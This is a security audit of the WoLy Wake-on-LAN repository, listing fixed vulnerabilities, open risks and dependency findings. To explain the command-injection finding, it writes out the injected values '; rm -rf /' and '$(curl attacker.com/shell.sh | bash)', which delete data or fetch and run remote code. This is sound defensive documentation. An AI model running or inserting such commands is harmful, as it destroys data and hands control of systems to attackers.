# WoLy Server — Security Audit

**Date:** 2026-02-08
**Scope:** Full repository (`apps/cnc`, `apps/node-agent`, `packages/protocol`)

---

## Executive Summary

The WoLy server codebase follows many security best practices: parameterized SQL queries, Helmet security headers, Zod schema validation on WebSocket messages, timing-safe token comparison, and proper `.gitignore` rules. This audit documents security fixes that were applied before making the repository public, along with known risks that remain to be addressed over time.

---

## Critical Issues (Fixed)

### 1. Committed SQLite Database with Real Device Data

| Severity | Status |
|----------|--------|
| **CRITICAL** | ✅ **FIXED** |

**Finding:** `apps/cnc/db/woly-cnc.db` was committed to version control containing:
- Real MAC addresses (e.g., `80:6D:97:60:39:08`, `BC:07:1D:DD:5B:9C`)
- Real device hostnames (e.g., `PHANTOM-MBP`, `PHANTOM-NAS`, `RASPBERRYPI`)
- Internal IP addresses (192.168.1.x range)
- Network topology metadata (subnet, gateway)

**Risk:** Exposes your home network device inventory to anyone who clones the repo, including historical git data.

**Fix applied:** Removed the database file from tracking, and strengthened `.gitignore` with an explicit `**/db/*.db` pattern.

**Completed:** History purged with `git filter-repo` on 2026-02-08.

### 2. Command Injection in Network Discovery

| Severity | Status |
|----------|--------|
| **CRITICAL** | ✅ **FIXED** |

**Finding:** `apps/node-agent/src/services/networkDiscovery.ts` used `execSync()` with string interpolation:
```typescript
// BEFORE (vulnerable)
execSync(`nbtstat -A ${ip}`, ...)
execSync(`nmblookup -A ${ip}`, ...)
```

If an attacker could influence the `ip` parameter (e.g., via crafted ARP responses), they could inject shell commands like `; rm -rf /` or `$(curl attacker.com/shell.sh | bash)`.

**Fix applied:** Replaced with `execFileSync()` which passes arguments as an array, preventing shell interpretation:
```typescript
// AFTER (safe)
execFileSync('nbtstat', ['-A', ip], ...)
execFileSync('nmblookup', ['-A', ip], ...)
```

### 3. Weak Command ID Generation

| Severity | Status |
|----------|--------|
| **MEDIUM** | ✅ **FIXED** |

**Finding:** `apps/cnc/src/services/commandRouter.ts` used `Math.random()` for command IDs:
```typescript
`cmd_${Date.now()}_${Math.random().toString(36).substring(7)}`
```
`Math.random()` is not cryptographically secure and the timestamp prefix makes IDs predictable.

**Fix applied:** Replaced with `crypto.randomUUID()`:
```typescript
`cmd_${randomUUID()}`
```

### 4. Missing Request Body Size Limits

| Severity | Status |
|----------|--------|
| **HIGH** | ✅ **FIXED** |

**Finding:** Both `apps/cnc/src/server.ts` and `apps/node-agent/src/app.ts` used `express.json()` with no size limit, allowing arbitrarily large request bodies (memory exhaustion DoS).

**Fix applied:** Added `{ limit: '100kb' }` to both servers.

### 5. Missing WebSocket Message Size Limit

| Severity | Status |
|----------|--------|
| **HIGH** | ✅ **FIXED** |

**Finding:** `apps/cnc/src/websocket/server.ts` created the WebSocket server with no `maxPayload`, allowing gigabyte-sized messages that could exhaust server memory.

**Fix applied:** Added `maxPayload: 256 * 1024` (256 KB) limit.

### 6. Hardcoded Secrets in docker-compose.yml

| Severity | Status |
|----------|--------|
| **MEDIUM** | ✅ **FIXED** |

**Finding:** `apps/cnc/docker-compose.yml` contained hardcoded database password (`woly_password`), JWT secret, and auth tokens with fallback defaults.

**Fix applied:** Replaced with `${VAR:?Set VAR in .env}` syntax that requires explicit configuration and fails fast if secrets aren't set.

### 7. Placeholder CORS Origin in Production

| Severity | Status |
|----------|--------|
| **MEDIUM** | ✅ **FIXED** |

**Finding:** `apps/cnc/src/server.ts` had a hardcoded placeholder `https://your-mobile-app-domain.com` as the production CORS origin, which would never match any real request.

**Fix applied:** Changed to read from `CORS_ORIGINS` environment variable (comma-separated list).

### 8. Timing-Unsafe Static Token Comparison

| Severity | Status |
|----------|--------|
| **MEDIUM** | ✅ **FIXED** |

**Finding:** `apps/cnc/src/websocket/upgradeAuth.ts` used `Array.includes()` to check node auth tokens:

```typescript
// BEFORE (timing-vulnerable)
config.nodeAuthTokens.includes(token)
```

This is not constant-time — an attacker could measure response time differences to progressively guess token bytes. The same pattern existed in `nodeManager.ts`'s defensive re-validation.

**Fix applied:** Introduced `matchesStaticToken()` using `crypto.timingSafeEqual` with proper length-guarded comparison:

```typescript
// AFTER (timing-safe)
matchesStaticToken(token, config.nodeAuthTokens)
```

### 9. Auth Token Leaked in Registration Payload

| Severity | Status |
|----------|--------|
| **MEDIUM** | ✅ **FIXED** |

**Finding:** After the WebSocket upgrade already validated the node's auth token via HTTP headers, the node-agent sent the same token **again** in the plaintext `register` message payload (`registration.authToken`). This is redundant and increases exposure surface — if WebSocket message logging is enabled (e.g., by a reverse proxy), the token appears in cleartext.

**Fix applied:**

- Made `authToken` optional in the protocol schema (backwards-compatible with older nodes)
- Node-agent no longer sends `authToken` in the registration payload
- CnC server skips the payload token check when `authToken` is absent (upgrade auth is sufficient)

### 10. No Client-Side TLS Enforcement

| Severity | Status |
|----------|--------|
| **MEDIUM** | ✅ **FIXED** |

**Finding:** The node-agent would connect to `ws://` (unencrypted) URLs even in production, allowing token interception by network observers. The CnC server had `WS_REQUIRE_TLS` but the node-agent had no equivalent client-side check.

**Fix applied:** `validateAgentConfig()` now rejects `CNC_URL` values that don't start with `wss://` when `NODE_ENV=production`.

---

## Known Risks (Not Fixed — Require Design Decisions)

### 11. Node-Agent API Has No Authentication

| Severity | Impact |
|----------|--------|
| **HIGH** | Anyone with network access can wake computers, add/delete hosts, trigger scans |

The node-agent API (`/hosts/*`) has zero authentication. All endpoints are publicly accessible. This is by design for the standalone mode (local LAN use), but risky if the agent is exposed beyond the local network.

**Recommendation:** Add optional API key authentication that can be enabled via environment variable. When `NODE_API_KEY` is set, require it in an `Authorization` header.

### 12. CnC Node Listing Routes Are Unauthenticated

| Severity | Impact |
|----------|--------|
| **MEDIUM** | `GET /api/nodes`, `GET /api/nodes/:id`, `GET /api/nodes/:id/health` require no JWT |

While host management endpoints are properly JWT-protected, the node listing endpoints expose node metadata (IDs, locations, capabilities, last heartbeat) to anyone.

**Recommendation:** Move node listing behind `authenticateJwt` middleware if the API is internet-facing.

### 13. No Rate Limiting on CnC Token Exchange

| Severity | Impact |
|----------|--------|
| **MEDIUM** | `POST /api/auth/token` can be brute-forced with no throttling |

**Recommendation:** Add `express-rate-limit` (already used by node-agent) to the CnC app, especially on the auth endpoint.

### 14. No WebSocket Message Rate Limiting

| Severity | Impact |
|----------|--------|
| **LOW** | A connected node could flood the server with messages |

**Recommendation:** Implement per-connection message rate limiting (e.g., 100 messages/second).

### 15. No WebSocket Connection Limits per IP

| Severity | Impact |
|----------|--------|
| **LOW** | An attacker could open many WebSocket connections from the same IP |

**Recommendation:** Track connections per IP and enforce a maximum (e.g., 10 per IP).

### 16. Overly Broad CORS on Node-Agent

| Severity | Impact |
|----------|--------|
| **LOW** | Allows ANY `*.ngrok-free.app` and `*.netlify.app` subdomain |

This is fine for development but should be tightened for production deployments.

### 17. Session Token Secret Defaults to JWT Secret

| Severity | Impact |
|----------|--------|
| **LOW** | If `JWT_SECRET` is compromised, WebSocket session tokens are also compromised |

`WS_SESSION_TOKEN_SECRETS` defaults to `JWT_SECRET` in the CnC config. Best practice: use separate secrets.

---

## Dependency Vulnerabilities

### npm audit Results

| Status | Details |
|--------|---------|
| ✅ **RESOLVED** | `npm audit` reports **0 vulnerabilities** |

**Previously:** 3 high severity vulnerabilities in the `local-devices` dependency chain (`get-ip-range`, `ip`, `local-devices`). The `ip` package (GHSA-2p57-rm9w-gvfp) has **no patched version** — all releases `<=2.0.1` are vulnerable. Overrides cannot fix this.

**Fix applied:** Replaced `local-devices` with a built-in ARP table parser (`arp -a`). This eliminated all 3 vulnerable transitive dependencies (`local-devices`, `get-ip-range`, `ip`, plus `mz` — 15 packages total). The `local-devices` package was unmaintained (last release August 2022) and only provided a thin wrapper around the system `arp` command.

### Notable Dependencies

| Package | Notes |
|---------|-------|
| `wake_on_lan` | Pinned to `1.0.0` — check if maintained |
| `ping` | Network ping — verify it's the expected npm package |
| `better-sqlite3` | Well-maintained, properly used with parameterized queries ✅ |

---

## What's Done Well

| Area | Details |
|------|---------|
| **SQL Injection** | ✅ All queries use parameterized statements throughout both apps |
| **Zod Validation** | ✅ All WebSocket messages validated against discriminated union schemas |
| **JWT Auth** | ✅ HS256 enforced, expiry checked, timing-safe comparison, issuer/audience validated |
| **Token Handling** | ✅ Timing-safe comparison (`timingSafeEqual`) prevents timing attacks |
| **Session Tokens** | ✅ Secret rotation support, clock skew tolerance, lifetime bounds |
| **Security Headers** | ✅ Helmet.js enabled on both apps |
| **Graceful Shutdown** | ✅ Both apps handle SIGTERM/SIGINT properly |
| **Docker Security** | ✅ Multi-stage builds, non-root user (`nodejs:1001`), Alpine images |
| **Secret Management** | ✅ `.env` files properly gitignored, no production secrets in code |
| **Log Sanitization** | ✅ Sensitive data (tokens) sanitized in CnC client logs |
| **TLS Enforcement** | ✅ `WS_REQUIRE_TLS` option available for WebSocket connections |
| **Error Handling** | ✅ Stack traces only exposed in development mode |

---

## Security Fixes Applied

- [x] Remove committed database with real device data
- [x] Fix command injection vulnerability
- [x] Remove hardcoded secrets from docker-compose.yml
- [x] Fix placeholder CORS origin
- [x] Add request body size limits
- [x] Add WebSocket message size limits
- [x] Use cryptographically secure command IDs
- [x] Purge database file from git history (`git filter-repo` — completed 2026-02-08)
- [x] Run `npm audit fix` for dependency vulnerabilities — replaced `local-devices` with built-in ARP parser (0 vulnerabilities)
- [x] Review the `.env.example` files — no real values leaked, only placeholder defaults
- [x] Fix timing-safe static token comparison in WebSocket upgrade auth
- [x] Stop leaking auth token in registration payload (already validated during WS upgrade)
- [x] Enforce `wss://` in production on node-agent client side
- [ ] Consider adding API authentication to node-agent
- [ ] Consider adding rate limiting to CnC auth endpoint

---

## Summary

The WoLy server demonstrates solid security practices for a distributed Wake-on-LAN management system:

1. **Code quality is strong** — parameterized queries, proper JWT handling with timing-safe comparisons, Zod validation, and Helmet headers show thoughtful security design.

2. **Critical issues were addressed** before going public. The command injection vulnerability was limited to NetBIOS hostname lookups from ARP scan results (not user input), reducing its blast radius, but was properly fixed nonetheless.

3. **No production secrets were leaked.** Environment files were never committed, docker-compose defaults were development-only, and the committed SQLite database was removed from git history.

4. **Architecture is well-organized** — separated protocol package, workspace links, and proper build ordering make this a good reference implementation.

5. **Production hardening recommendations** (ongoing):
   - Add API authentication to the node-agent for internet-facing deployments
   - Add rate limiting to the CnC endpoints
   - Consider pre-commit hooks with `git-secrets` to prevent accidental credential commits

This repository serves as a solid example of a secure WoL management system implementation.
